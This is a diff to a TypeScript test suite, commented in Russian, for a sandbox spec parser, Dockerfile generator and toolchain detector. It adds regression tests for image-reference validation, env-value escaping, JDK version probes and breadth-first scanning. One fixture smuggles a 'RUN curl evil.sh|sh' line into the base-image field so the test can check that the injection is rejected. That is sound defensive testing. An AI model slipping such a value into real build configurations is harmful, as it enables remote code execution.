@@ -7,7 +7,7 @@
  * интеграционный сценарий, ему свой тест с явным пропуском без Docker.
  */
 
-import { deepStrictEqual, strictEqual, throws } from 'node:assert/strict';
+import { deepStrictEqual, ok, strictEqual, throws } from 'node:assert/strict';
 import { chmodSync, mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
 import { tmpdir } from 'node:os';
 import { join } from 'node:path';
@@ -52,6 +52,32 @@ describe('разбор .sdlc/sandbox.json', () => {
 
   it('нет base — отказ', () => {
     throws(() => parseSandboxSpec(JSON.stringify({ toolchains: {} }), 'x'), SandboxSpecError);
+  });
+
+  it('base с переводом строки — отказ, а не молчаливая инъекция в Dockerfile (раньше принималось: только "непустая строка")', () => {
+    throws(
+      () =>
+        parseSandboxSpec(
+          JSON.stringify({ base: 'debian:12-slim\nRUN curl evil.sh|sh', toolchains: {} }),
+          'x',
+        ),
+      SandboxSpecError,
+    );
+  });
+
+  it('base с пробелом — отказ', () => {
+    throws(
+      () => parseSandboxSpec(JSON.stringify({ base: 'debian 12-slim', toolchains: {} }), 'x'),
+      SandboxSpecError,
+    );
+  });
+
+  it('base — валидная ссылка на образ (реестр/репозиторий:тег) проходит', () => {
+    const spec = parseSandboxSpec(
+      JSON.stringify({ base: 'ghcr.io/org/image:1.2.3', toolchains: {} }),
+      'x',
+    );
+    strictEqual(spec.base, 'ghcr.io/org/image:1.2.3');
   });
 
   it('неизвестный тулчейн называется по имени', () => {
@@ -212,6 +238,17 @@ describe('генератор Dockerfile', () => {
     strictEqual(df.includes('ENV X="a\\"b\\\\c"'), true, df);
   });
 
+  it('env-значение с $ экранируется — Dockerfile не разворачивает его как переменную', () => {
+    // Регресс: проверено реальной сборкой, что Dockerfile разворачивает ${VAR}/$VAR внутри
+    // ENV "..." по значениям, объявленным раньше в этом же Dockerfile (JAVA_HOME/PATH) —
+    // без экранирования env.X со значением "${JAVA_HOME}/evil" молча подставлял бы реальный
+    // JAVA_HOME вместо буквальной строки из sandbox.json.
+    const spec: SandboxSpec = { base: 'debian:12-slim', toolchains: {}, env: { X: '${JAVA_HOME}/evil' } };
+    const df = buildDockerfile(spec);
+    strictEqual(df.includes('ENV X="\\${JAVA_HOME}/evil"'), true, df);
+    strictEqual(df.includes('ENV X="${JAVA_HOME}/evil"'), false, df);
+  });
+
   it('два проекта, схлопывающихся в один safeName — разные теги образа (регресс на коллизию контейнера/тома)', () => {
     // "Foo Bar" и "foo-bar" оба дают safeName "foo-bar" — раньше это был один и тот же тег.
     const tagA = imageTag('Foo Bar', CV_LIKE_SPEC);
@@ -282,6 +319,55 @@ describe('detectSandboxSpec: черновик спеки по составу р�
         strictEqual(detectSandboxSpec(root).spec.toolchains.jdk?.version, '17');
       },
     );
+  });
+
+  it('JDK 8: проба ждёт "1.8. — дореформенную схему вывода java -version, не "8.', () => {
+    // Регресс: проверено в Docker — `eclipse-temurin:8-jdk java -version` печатает
+    // `openjdk version "1.8.0_502"`, не `"8...`. Проба без поправки ложно проваливалась
+    // на верно установленной JDK 8.
+    withFixture(
+      { 'pom.xml': '<project><properties><java.version>8</java.version></properties></project>' },
+      (root) => {
+        const { spec } = detectSandboxSpec(root);
+        strictEqual(spec.toolchains.jdk?.version, '8');
+        const probe = spec.probes?.find((p) => p.cmd === 'java -version');
+        ok(probe !== undefined);
+        ok(new RegExp(probe.expect).test('openjdk version "1.8.0_502"'), probe.expect);
+        ok(!new RegExp(probe.expect).test('openjdk version "18.0.1"'), probe.expect);
+      },
+    );
+  });
+
+  it('JDK 21: проба ждёт "21. напрямую — постреформенная схема (9+)', () => {
+    withFixture(
+      { 'pom.xml': '<project><properties><java.version>21</java.version></properties></project>' },
+      (root) => {
+        const { spec } = detectSandboxSpec(root);
+        const probe = spec.probes?.find((p) => p.cmd === 'java -version');
+        ok(probe !== undefined);
+        ok(new RegExp(probe.expect).test('openjdk version "21.0.11"'), probe.expect);
+        ok(!new RegExp(probe.expect).test('openjdk version "1.21.0"'), probe.expect);
+      },
+    );
+  });
+
+  it('BFS: манифест верхнего уровня находится, даже если СОСЕДНИЙ каталог верхнего уровня переполнен файлами', () => {
+    // Регресс на DFS через стек: `pop()` берёт ПОСЛЕДНИЙ добавленный каталог первым, то
+    // есть при алфавитном readdirSync() каталог, идущий позже по имени, разбирался бы
+    // ПЕРВЫМ и мог сжечь весь бюджет MAX_FILES_SCANNED (4000) на свои файлы, не дав дойти
+    // до pom.xml в каталоге, идущем раньше по имени. `aaa` (с манифестом) специально назван
+    // раньше `zzz` (заведомо переполнен) по алфавиту — именно тот порядок, где старый DFS
+    // проваливался, а BFS (очередь) — нет, потому что оба каталога верхнего уровня стоят
+    // в очереди РЯДОМ и `aaa` обрабатывается первым независимо от того, что лежит в `zzz`.
+    const files: Record<string, string> = {
+      'aaa/pom.xml': '<project><properties><java.version>17</java.version></properties></project>',
+    };
+    for (let i = 0; i < 4_500; i++) files[`zzz/junk-${i}.txt`] = 'x';
+
+    withFixture(files, (root) => {
+      const { spec } = detectSandboxSpec(root);
+      strictEqual(spec.toolchains.jdk?.version, '17');
+    });
   });
 
   it('node_modules и target пропускаются — детект не тонет в чужих манифестах', () => {
